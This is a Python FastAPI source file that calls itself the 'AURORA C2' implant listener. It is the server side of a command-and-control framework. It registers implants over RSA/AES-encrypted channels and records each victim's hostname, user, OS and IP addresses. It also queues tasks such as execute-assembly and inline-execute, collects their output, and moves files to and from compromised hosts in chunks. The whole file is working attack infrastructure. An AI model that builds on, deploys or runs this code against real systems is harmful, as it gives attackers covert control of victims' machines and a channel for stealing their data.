"""
AURORA C2 - Encrypted implant listener routes.
"""
import base64
import logging
from typing import Optional

from fastapi import APIRouter, HTTPException, Request
from fastapi.responses import JSONResponse

import config
import database as db
from app_state import get_conn
from commands import CMD_TYPE_MAP
from crypto import b64decode, decrypt_key, encrypt_key, rsa_decrypt_b64
from runtime import (
    complete_console_task,
    complete_task_session,
    get_beacon_session_key,
    get_pending_task_sessions,
    get_task_session,
    mark_task_session_sent,
    set_beacon_session_key,
    update_beacon_session_seen,
    update_console_pending,
    upsert_beacon_session,
)
from transfers import (
    TransferError,
    cleanup_browser_upload,
    read_upload_chunk,
    resolve_local_display_path,
    write_download_chunk,
)
from ws import ws_broadcast_sync

router = APIRouter()
logger = logging.getLogger("aurora.beacon")


def _merge_stream_output(previous: str, current: str) -> str:
    """Merge cumulative/overlapping async task output without duplicating lines."""
    if not previous:
        return current
    if not current:
        return previous
    if current in previous:
        return previous
    if current.startswith(previous):
        return current

    max_overlap = min(len(previous), len(current))
    for size in range(max_overlap, 0, -1):
        if previous.endswith(current[:size]):
            return previous + current[size:]
    return f"{previous}\n{current}"


def _require_session_key(bid: str) -> bytes:
    session_key = get_beacon_session_key(bid)
    if not session_key:
        raise HTTPException(409, "Missing session key")
    return session_key


@router.post("/beacon/register")
async def beacon_register(request: Request):
    raw = (await request.body()).decode().strip()
    if not raw:
        logger.error("Empty beacon register body")
        raise HTTPException(400, "Empty body")

    session_key = None
    try:
        if not raw.startswith("RSA2|"):
            raise ValueError("RSA2 registration required")
        # Hybrid packet:
        # RSA2|rsa_b64(REGISTER2|key_b64|bid)|aes_b64(REGISTER|host|user|os|arch|ip|pid|bid)
        _, rsa_b64, aes_b64 = raw.split("|", 2)
        rsa_plain = rsa_decrypt_b64(rsa_b64)
        rp = rsa_plain.split("|")
        if len(rp) < 3 or rp[0] != "REGISTER2":
            raise ValueError("Bad RSA register packet")
        session_key = base64.b64decode(rp[1])
        if len(session_key) != 32:
            raise ValueError("Bad session key length")
        plain = decrypt_key(aes_b64, session_key)
    except Exception as e:
        logger.error("Beacon register decrypt failed: %s", e)
        raise HTTPException(400, "Decrypt failed")

    parts = plain.split("|")
    if len(parts) < 8 or parts[0] != "REGISTER":
        first = parts[0] if parts else "empty"
        logger.error("Bad beacon register format: parts=%s first=%s", len(parts), first)
        raise HTTPException(400, "Bad register format")

    _, hostname, username, os_name, arch, ip, pid_str, bid = parts[:8]
    listener_id = parts[8] if len(parts) >= 9 and parts[8] else "default"
    conn = get_conn()
    if not db.get_listener(conn, listener_id):
        raise HTTPException(400, "Unknown listener")
    pid = int(pid_str) if pid_str.isdigit() else 0
    external_ip = request.client.host if request.client else "-"

    should_emit_online = upsert_beacon_session(
        bid, hostname, username, os_name, arch, ip, pid, external_ip,
        session_key=session_key, listener_id=listener_id,
    )
    if should_emit_online:
        db.log_event(conn, "INFO", f"Beacon online: {bid} ({hostname}@{username}) listener={listener_id} ext={external_ip} int={ip}", bid)
        ws_broadcast_sync({
            "type": "beacon_register",
            "beacon_id": bid,
            "hostname": hostname,
            "username": username,
            "os": os_name,
            "ip": ip,
            "internal_ip": ip,
            "external_ip": external_ip,
            "listener_id": listener_id,
        })

    resp_plain = f"OK|{config.DEFAULT_SLEEP}|{config.DEFAULT_JITTER}"
    resp_enc = encrypt_key(resp_plain, session_key)
    return JSONResponse({"data": resp_enc})


@router.get("/beacon/task/{bid}")
async def beacon_get_task(bid: str, request: Request, hb: Optional[str] = None):
    hb = hb or request.cookies.get("hb")
    heartbeat_session_key = None
    heartbeat_valid = False
    if hb:
        try:
            hb_plain = rsa_decrypt_b64(hb)
            # HEARTBEAT|beacon_id|session_key_b64
            hp = hb_plain.split("|")
            if len(hp) >= 3 and hp[0] == "HEARTBEAT" and hp[1] == bid:
                hb_listener_id = hp[3] if len(hp) >= 4 and hp[3] else "default"
                if not db.get_listener(get_conn(), hb_listener_id):
                    raise ValueError("Unknown listener")
                sk = base64.b64decode(hp[2])
                if len(sk) == 32:
                    heartbeat_session_key = sk
                    heartbeat_valid = True
                    set_beacon_session_key(bid, sk)
        except Exception:
            pass

    if not heartbeat_valid:
        raise HTTPException(400, "Invalid heartbeat")

    if heartbeat_session_key is None:
        raise HTTPException(400, "Invalid heartbeat")

    session_key = get_beacon_session_key(bid) or heartbeat_session_key
    if not update_beacon_session_seen(bid):
        return JSONResponse({"data": encrypt_key("REREGISTER", heartbeat_session_key)})
    if not session_key:
        raise HTTPException(409, "Missing session key")

    tasks = get_pending_task_sessions(bid, limit=5)
    if not tasks:
        enc = encrypt_key("NOTASK", session_key)
        return JSONResponse({"data": enc})

    t = tasks[0]
    mark_task_session_sent(t["id"])
    update_console_pending(t["id"], "[sent] waiting for beacon...")

    cmd_type = CMD_TYPE_MAP.get(t["command"], -1)
    plain = f"TASK|{t['id']}|{cmd_type}|{t['args']}"

    ws_broadcast_sync({
        "type": "task_sent",
        "beacon_id": bid,
        "task_id": t["id"],
        "command": t["command"],
        "source": t.get("meta", {}).get("source", "console"),
    })
    enc = encrypt_key(plain, session_key)
    return JSONResponse({"data": enc})


@router.post("/beacon/result/{bid}")
async def beacon_result(bid: str, request: Request):
    raw = (await request.body()).decode().strip()

    if not raw:
        logger.error("Empty beacon result body")
        raise HTTPException(400, "Empty body")

    session_key = _require_session_key(bid)
    try:
        plain = decrypt_key(raw, session_key)
    except Exception as e:
        logger.error("Beacon result decrypt failed: %s", e)
        raise HTTPException(400, "Decrypt failed")

    parts = plain.split("|", 3)
    if len(parts) < 4 or parts[0] != "RESULT":
        first = parts[0] if parts else "empty"
        logger.error("Bad beacon result format: parts=%s first=%s", len(parts), first)
        raise HTTPException(400, "Bad result format")

    _, task_id, status, output_b64 = parts
    try:
        output = b64decode(output_b64).decode(errors="replace")
    except Exception:
        output = output_b64

    task = get_task_session(task_id)
    task_meta = task.get("meta", {}) if task else {}
    if (
        task
        and task.get("command") in ("upload", "download")
        and status == "success"
        and output.startswith("[async]")
    ):
        update_beacon_session_seen(bid)
        enc = encrypt_key("OK", session_key)
        return JSONResponse({"data": enc})

    result_output = output
    if (
        task
        and task.get("command") == "download"
        and status == "success"
        and "Download started" not in output
    ):
        meta = task.get("meta", {})
        try:
            local_path = resolve_local_display_path(meta.get("local_path", ""))
            result_output = f"{output}\nSaved to: {local_path}"
        except TransferError:
            pass

    if task and task.get("command") == "upload":
        cleanup_browser_upload(task_meta.get("local_path", ""))

    stored_result = result_output
    if task and task.get("command") in ("inline-execute", "execute-assembly") and task.get("result"):
        stored_result = _merge_stream_output(task["result"] or "", result_output)

    complete_task_session(task_id, status, stored_result)
    update_beacon_session_seen(bid)

    source = task_meta.get("source", "console")
    if source == "console":
        complete_console_task(task_id, "result" if status == "success" else "error", stored_result or "(no output)")
    ws_result = result_output if source == "proclist" else result_output[:4096]
    ws_broadcast_sync({
        "type": "task_result",
        "beacon_id": bid,
        "task_id": task_id,
        "status": status,
        "result": ws_result,
        "source": source,
    })

    enc = encrypt_key("OK", session_key)
    return JSONResponse({"data": enc})


@router.get("/beacon/upload/{bid}/{task_id}/{offset}")
async def beacon_upload_chunk(bid: str, task_id: str, offset: int):
    session_key = _require_session_key(bid)
    if not update_beacon_session_seen(bid):
        raise HTTPException(404, "Unknown beacon")

    task = get_task_session(task_id)
    if not task or task.get("command") != "upload":
        raise HTTPException(404, "Upload task not found")

    meta = task.get("meta", {})
    try:
        chunk_b64, eof = read_upload_chunk(meta.get("local_path", ""), offset)
    except TransferError as exc:
        msg = f"ERROR|{exc}"
        enc = encrypt_key(msg, session_key)
        return JSONResponse({"data": enc})

    msg = f"UPLOAD|{eof}|{chunk_b64}"
    enc = encrypt_key(msg, session_key)
    return JSONResponse({"data": enc})


@router.post("/beacon/download/{bid}")
async def beacon_download_chunk(bid: str, request: Request):
    session_key = _require_session_key(bid)

    raw = (await request.body()).decode().strip()
    if not raw:
        raise HTTPException(400, "Empty body")

    try:
        plain = decrypt_key(raw, session_key)
    except Exception as exc:
        logger.error("Download chunk decrypt failed: %s", exc)
        raise HTTPException(400, "Decrypt failed")

    parts = plain.split("|", 4)
    if len(parts) < 5 or parts[0] != "DOWNLOAD":
        raise HTTPException(400, "Bad download chunk format")

    _, task_id, offset_str, eof_str, chunk_b64 = parts
    task = get_task_session(task_id)
    if not task or task.get("command") != "download":
        raise HTTPException(404, "Download task not found")

    meta = task.get("meta", {})
    try:
        offset = int(offset_str)
        written = write_download_chunk(meta.get("local_path", ""), offset, chunk_b64)
    except (TransferError, ValueError) as exc:
        msg = f"ERROR|{exc}"
        enc = encrypt_key(msg, session_key)
        return JSONResponse({"data": enc})

    if eof_str == "1":
        try:
            resolve_local_display_path(meta.get("local_path", ""))
        except TransferError:
            pass

    msg = f"OK|{written}"
    enc = encrypt_key(msg, session_key)
    return JSONResponse({"data": enc})
